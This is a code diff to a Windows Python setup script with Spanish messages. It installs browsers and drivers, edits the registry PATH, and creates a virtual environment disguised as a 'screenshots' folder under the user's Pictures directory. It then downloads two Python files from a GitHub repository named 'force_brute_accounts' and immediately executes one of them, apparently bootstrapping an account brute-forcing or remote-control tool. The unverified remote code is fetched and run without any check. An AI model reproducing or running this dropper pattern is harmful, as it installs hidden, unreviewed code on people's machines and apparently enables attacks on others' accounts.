@@ -3,6 +3,37 @@ import subprocess
 import urllib.request
 import zipfile
 import winreg
+import getpass
+from shutil import move
+
+def playwright_complemento():
+    print('[-] Instalando Complemento De Playwright')
+    target_dir = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\ms-playwright\\firefox-1449"
+    url = 'https://playwright.azureedge.net/builds/firefox/1449/firefox-win64.zip'
+    name_tmp = os.path.basename(url)
+
+    os.path.basename(url)  
+    urllib.request.urlretrieve(url,url[53:])
+
+    os.makedirs(target_dir, exist_ok=True)
+    move(os.path.join(os.getcwd(),url[53:]),target_dir)
+    os.chdir(target_dir)
+    with zipfile.ZipFile(url[53:], "r") as zip_ref:
+        zip_ref.extractall()
+    os.remove(name_tmp)
+
+try:
+
+    import selenium
+    import PIL
+    import playwright
+    import ConfigStrem
+
+except Exception:
+    print('[-] Instalando librerias falatantes')
+    result = subprocess.run(['pip','install','pillow','selenium','playwright'], stdout = subprocess.PIPE, stderr = subprocess.PIPE)
+    playwright_complemento()
+
 
 def check_firefox_installed():
     try:
@@ -73,14 +104,11 @@ def install_geckodriver():
         winreg.SetValueEx(key, "Path", 0, winreg.REG_EXPAND_SZ, new_path_value)
         winreg.CloseKey(key)
         print("[-] geckodriver agregado correctamente a las variables de entorno.")
-
-    
+  
 def install_python():
     cmd = 'python --version'
-    msg = subprocess.run(cmd,stdout= subprocess.PIPE,stderr= subprocess.PIPE)
-    reg = msg.stdout.decode()
-
-    if reg.startswith('Python 3.12.1'):
+    reg = os.popen(cmd).read().rstrip()
+    if reg.startswith('Python'):
         print('[-] python ya instado')
 
     else:
@@ -93,33 +121,40 @@ def install_python():
         print("[-] Python instalado correctamente.")
         
 def create_virtual_environment():
-    print("[-] Creando entorno virtual...")
+
     pictures_path = os.path.expanduser("~/Pictures")
     screenshots_path = os.path.join(pictures_path, "screenshots")
-    subprocess.run(["python", "-m", "venv", screenshots_path])
-    print("[-] Entorno virtual creado correctamente.")
+
+    if os.path.exists(screenshots_path):
+        print('[-] Directorio de entorno virtual ya creado')
+
+    else:
+        print("[-] Creando entorno virtual...")
+        subprocess.run(["python", "-m", "venv", screenshots_path])
+        print("[-] Entorno virtual creado correctamente.")
 
 def activate_virtual_environment():
-    print("[-] Activando entorno virtual...")
-    pictures_path = os.path.expanduser("~/Pictures")
-    screenshots_path = os.path.join(pictures_path, "screenshots", "Scripts", "activate.bat")
-    subprocess.run([screenshots_path])
-    print("[-] Entorno virtual activado.")
-
-    subprocess.run(["pip", "install", "selenium", "pillow", "playwright"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-    subprocess.run(["playwright","install"])
-    print("[-] Librerías instaladas correctamente.")
-
-    print("[-] Descargando Scripts...")
+    pictures_path = os.path.expanduser(r"~\Pictures")
+    if os.getcwd() != pictures_path:
+        screenshots_path = os.path.join(pictures_path, "screenshots", "Scripts", "activate.bat")
+        os.chdir(screenshots_path[:-20])
+        subprocess.run([screenshots_path])
+        print("[-] Entorno virtual activado.")
     
-    ConfigStrem = "https://raw.githubusercontent.com/Moubotred/force_brute_accounts/main/Make/ConfigStrem.py"
-    GuiRemoto = "https://raw.githubusercontent.com/Moubotred/force_brute_accounts/main/Make/GuiRemoto.py"
-    
-    urllib.request.urlretrieve(ConfigStrem, ConfigStrem[-14:])
-    urllib.request.urlretrieve(GuiRemoto, GuiRemoto[-12:])
+    if os.path.exists(f'{screenshots_path[:-20]}\\ConfigStrem.py') and os.path.exists(f'{screenshots_path[:-20]}\\GuiRemoto.py'):
+        print("[-] Scripts Encontrados ...")
+        os.system('python GuiRemoto.py')
 
-    print("[-] Scripts Descargados ...")
-    os.system('python GuiRemoto.py')
+    else:
+        ConfigStrem = "https://raw.githubusercontent.com/Moubotred/force_brute_accounts/main/Make/ConfigStrem.py"
+        GuiRemoto = "https://raw.githubusercontent.com/Moubotred/force_brute_accounts/main/Make/GuiRemoto.py"
+        
+        urllib.request.urlretrieve(ConfigStrem, ConfigStrem[-14:])
+        urllib.request.urlretrieve(GuiRemoto, GuiRemoto[-12:])
+
+        if os.path.exists(f'{screenshots_path[:-20]}\\ConfigStrem.py') and os.path.exists(f'{screenshots_path[:-20]}\\GuiRemoto.py'):
+            print("[-] Scripts Decargados ...")
+            os.system('python GuiRemoto.py')
 
 def setup():
     install_python()
